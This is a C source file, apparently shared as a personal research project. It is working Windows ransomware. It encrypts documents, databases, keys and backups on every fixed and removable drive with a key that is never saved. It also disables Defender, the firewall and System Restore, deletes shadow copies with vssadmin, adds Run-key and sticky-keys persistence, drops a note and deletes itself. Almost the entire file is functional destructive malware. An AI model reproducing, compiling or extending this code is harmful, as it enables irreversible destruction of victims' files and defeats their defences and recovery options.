/*
 * misery.c 
 * Author  : Jahanzaib Ashraf Mir
 * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
 *
 * Notes   :
 *   - Personal research project
 *   - Focused on systems-level programming and Windows internals
 *
 * Contact :
 *   GitHub  : https://github.com/jahanzaibmir
 *   LinkedIn : https://linkedin.com/jahanzaibmir
 *   InstaGram : https://instagram.com/jahanzaibmir_
 */

#define _WIN32_WINNT 0x0601 // Windows 7+
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <process.h>
#include <lm.h>
#include <winsvc.h>

/* 
 * CONFIGURATION & EXTENSIONS
 */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",
    ".exe",".dll",".msi",".bat",".cmd",".ps1",".vbs",".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn", NULL
};

/* 
 * CRYPTO ENGINE (AES-256 CBC with IV)
*/
static HCRYPTPROV  g_hProv   = 0;
static HCRYPTKEY   g_hAESKey = 0;
static BYTE        g_iv[16];  // Initialization Vector

static int InitCrypto(void) {
    if(!CryptAcquireContextA(&g_hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return 0;
    }
    // Generate a random key for this session
    if(!CryptGenKey(g_hProv, CALG_AES_256, CRYPT_EXPORTABLE, &g_hAESKey)) {
        CryptReleaseContext(g_hProv, 0);
        return 0;
    }
    // Generate random IV
    CryptGenRandom(g_hProv, 16, g_iv);
    return 1;
}

static void DoEncryptFile(const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) return;

    DWORD fs = GetFileSize(hFile, NULL);
    if(fs == INVALID_FILE_SIZE || fs < 1) { 
        CloseHandle(hFile); 
        return; 
    }

    // Allocate buffer for file content + IV prepended at start
    DWORD bufSize = fs + 64; 
    BYTE *buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!buf) { 
        CloseHandle(hFile); 
        return; 
    }

    // Read file content into buffer starting at offset 16 (leaving room for IV)
    DWORD rd;
    if(!ReadFile(hFile, buf + 16, fs, &rd, NULL)) { 
        VirtualFree(buf, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return;
    }

    // Prepare IV for encryption context
    BYTE ivCopy[16];
    memcpy(ivCopy, g_iv, 16);

    // Encrypt data starting at offset 16
    DWORD dataLen = rd;
    // Note: CryptEncrypt modifies the length parameter to reflect encrypted size
    if(!CryptEncrypt(g_hAESKey, 0, TRUE, 0, buf + 16, &dataLen, fs + 48)) {
        VirtualFree(buf, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return;
    }

    // Write IV to start of buffer (bytes 0-15)
    memcpy(buf, ivCopy, 16);

    // Overwrite original file with encrypted content
    HANDLE hWrite = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hWrite != INVALID_HANDLE_VALUE) {
        DWORD wr;
        // Total size = IV (16 bytes) + Encrypted Data (dataLen)
        WriteFile(hWrite, buf, dataLen + 16, &wr, NULL); 
        CloseHandle(hWrite);
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    CloseHandle(hFile);
}

static void EncryptDir(const char *dir) {
    char path[MAX_PATH * 2];
    snprintf(path, sizeof(path), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hF = FindFirstFileA(path, &fd);
    if(hF == INVALID_HANDLE_VALUE) return;

    do {
        if(!strcmp(fd.cFileName,".") || !strcmp(fd.cFileName,"..")) continue;

        char full[MAX_PATH * 2];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);

        // Skip system folders to avoid BSOD or loops
        if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if(strstr(full,"\\Windows") || strstr(full,"\\System32") || 
               strstr(full,"\\SysWOW64") || strstr(full,"\\Program Files") ||
               strstr(full,"\\AppData")) continue;
            EncryptDir(full); // Recursive
        } else {
            // Check extension
            const char *ext = strrchr(full, '.');
            if(ext) {
                int match = 0;
                for(int i=0; g_ext[i]; i++) {
                    if(_stricmp(ext, g_ext[i]) == 0) {
                        match = 1;
                        break;
                    }
                }
                if(match) {
                    // Check if already encrypted to prevent double encryption
                    char newp[MAX_PATH * 2];
                    snprintf(newp, sizeof(newp), "%s.encrypted", full);
                    if(GetFileAttributesA(full) != INVALID_FILE_ATTRIBUTES && 
                       GetFileAttributesA(newp) == INVALID_FILE_ATTRIBUTES) {
                        DoEncryptFile(full); // Use renamed function here
                        // Rename to .encrypted to mark as done
                        MoveFileExA(full, newp, MOVEFILE_REPLACE_EXISTING);
                    }
                }
            }
        }
    } while(FindNextFileA(hF, &fd));
    FindClose(hF);
}

/* 
 * DIRECT API EXECUTION
*/

// Helper to stop/disable service directly
static void ManageService(const char *svcName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if(!hSCM) return;
    
    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);
    if(hSvc) {
        SERVICE_STATUS ss;
        // Stop service
        ControlService(hSvc, SERVICE_STOP, &ss);
        
        // Disable service (start type disabled)
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
}

static void KillSecurityDirect() {
    // Directly manipulate registry and services without cmd.exe
    
    HKEY hk;
    DWORD val = 1;
    
    // Disable Defender via Registry
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);

    // Stop Services directly
    ManageService("WinDefend");
    ManageService("SecurityHealthService");
    ManageService("WdNisSvc");
    ManageService("Sense");
    
    // Disable Firewall via Registry
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, KEY_SET_VALUE, &hk);
    val = 0; // OFF
    RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
}

static void NukeBackupsDirect() {
    // Disable System Restore via Registry
    HKEY hk;
    DWORD val = 1;
    
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\System\\Restore", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
    
    // Clear Shadow Copies using CreateProcess for speed
    STARTUPINFOA si_start = {0}; 
    PROCESS_INFORMATION pi;
    char cmd[] = "vssadmin delete shadows /all /quiet";
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

static void InstallPersistenceDirect() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Registry Run Keys
    HKEY hk;
    
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hk);
    RegSetValueExA(hk, "WinUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // Sticky Keys Hijack
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe", 0, KEY_SET_VALUE, &hk);
    char debugger[MAX_PATH];
    strcpy(debugger, exePath);
    RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)debugger, strlen(debugger)+1);
    RegCloseKey(hk);
}

static void DropNoteDirect() {
    char note[2048];
    char mid[128];
    
    HKEY hk;
    DWORD sz = sizeof(mid);
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExA(hk, "MachineGuid", NULL, NULL, (BYTE*)mid, &sz);
        RegCloseKey(hk);
    } else {
        snprintf(mid, sizeof(mid), "%08lx", GetCurrentProcessId());
    }

   snprintf(note, sizeof(note),
    "\r\n"
    "  YO! Jahanzaib IS DaMN good"
    "\r\n", mid);

    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
    
    char fp[MAX_PATH * 2];
    snprintf(fp, sizeof(fp), "%s\\README.txt", path);
    
    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, note, strlen(note), &w, NULL);
        CloseHandle(hF);
    }
}

/*
 * MAIN LOGIC
 *  */

typedef struct { int id; } THD;

static unsigned __stdcall Worker(void *arg) {
    char buf[MAX_PATH];
    
    // Encrypt User Folders
    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf)==S_OK)       EncryptDir(buf);
    if(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf)==S_OK)   EncryptDir(buf);
    // CSIDL_DOWNLOADS is 0x0015
    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf)==S_OK)             EncryptDir(buf);
    
    // Encrypt Drives
    for(char d='C'; d<='Z'; d++) {
        char root[4] = {d,':','\\',0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
            EncryptDir(root);
        }
    }
    return 0;
}

static void ElevatePrivs() {
    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;

    const char *privs[] = {"SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege", "SeTakeOwnershipPrivilege", NULL};
    for(int i=0; privs[i]; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    CloseHandle(hToken);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Single Instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\StashCat_V2");
    if(!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if(hMutex) CloseHandle(hMutex);
        return 0;
    }

    ElevatePrivs();
    
    // Fast Security Kill (No CMD noise)
    KillSecurityDirect();
    NukeBackupsDirect();
    
    // Crypto Init
    if(!InitCrypto()) { 
        CloseHandle(hMutex); 
        return 1; 
    }

    // Parallel Encryption
    SYSTEM_INFO si_sys; // Renamed to 'si_sys' to avoid conflict with STARTUPINFO 'si'
    GetSystemInfo(&si_sys);
    int n = si_sys.dwNumberOfProcessors * 2;
    if(n > 8) n = 8; // Cap threads
    
    HANDLE threads[8];
    THD tdata[8];
    
    // Start encryption threads
    for(int i=0; i<n; i++) {
        tdata[i].id = i;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, Worker, &tdata[i], 0, NULL);
    }
    
    WaitForMultipleObjects(n, threads, TRUE, 180000); // 3 mins timeout
    
    for(int i=0; i<n; i++) CloseHandle(threads[i]);

    // Persistence & Note
    InstallPersistenceDirect();
    DropNoteDirect();

    // Cleanup Crypto
    CryptDestroyKey(g_hAESKey);
    CryptReleaseContext(g_hProv, 0);
    
    // Self Delete (Robust)
    char exeP[MAX_PATH];
    GetModuleFileNameA(NULL, exeP, MAX_PATH);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 3 & del /f /q \"%s\"", exeP);
    
    // Renamed local variable 'si' to 'si_start' to avoid conflict with SYSTEM_INFO si_sys
    STARTUPINFOA si_start = {0}; 
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
    
    CloseHandle(hMutex);
    return 0;
}
